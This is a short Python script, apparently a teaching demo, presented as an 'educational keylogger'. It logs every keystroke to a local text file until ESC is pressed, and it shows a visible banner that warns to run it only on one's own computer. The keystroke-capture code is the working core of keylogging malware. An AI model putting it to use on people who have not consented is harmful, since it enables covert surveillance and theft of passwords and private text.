from pynput import keyboard

LOG_FILE = "keylog.txt"


def on_press(key):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as file:
            file.write(key.char)

    except AttributeError:
        with open(LOG_FILE, "a", encoding="utf-8") as file:

            if key == keyboard.Key.space:
                file.write(" ")

            elif key == keyboard.Key.enter:
                file.write("\n")

            elif key == keyboard.Key.backspace:
                file.write("[BACKSPACE]")

            elif key == keyboard.Key.tab:
                file.write("[TAB]")

            elif key == keyboard.Key.esc:
                file.write("[ESC]")

            else:
                file.write(f"[{key}]")

    if key == keyboard.Key.esc:
        print("\nLogging stopped.")
        return False


print("================================")
print("       EDUCATIONAL KEYLOGGER")
print("================================")
print()
print("IMPORTANT:")
print("Use this program only on your own")
print("computer with explicit permission.")
print()
print("Press ESC to stop logging.")
print()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
